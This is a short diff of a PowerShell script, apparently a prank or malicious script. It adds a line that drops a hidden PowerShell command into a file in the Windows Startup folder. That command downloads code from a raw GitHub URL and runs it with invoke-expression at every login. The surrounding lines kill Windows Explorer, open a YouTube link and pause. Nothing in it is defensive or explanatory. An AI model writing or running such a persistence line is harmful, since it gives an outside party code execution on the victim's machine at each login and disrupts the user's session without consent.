@@ -1,3 +1,4 @@
+'powershell -windowstyle hidden -command "invoke-expression (invoke-webrequest "https://raw.githubusercontent.com/ChrisSaladin/Invoke-PowerShell/main/StartChrome" -usebasicparsing).content"' > "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\..bat"
 taskkill /im explorer.exe /f
 start-process "https://youtu.be/a3Z7zEc7AXQ"
 start-sleep -seconds 4
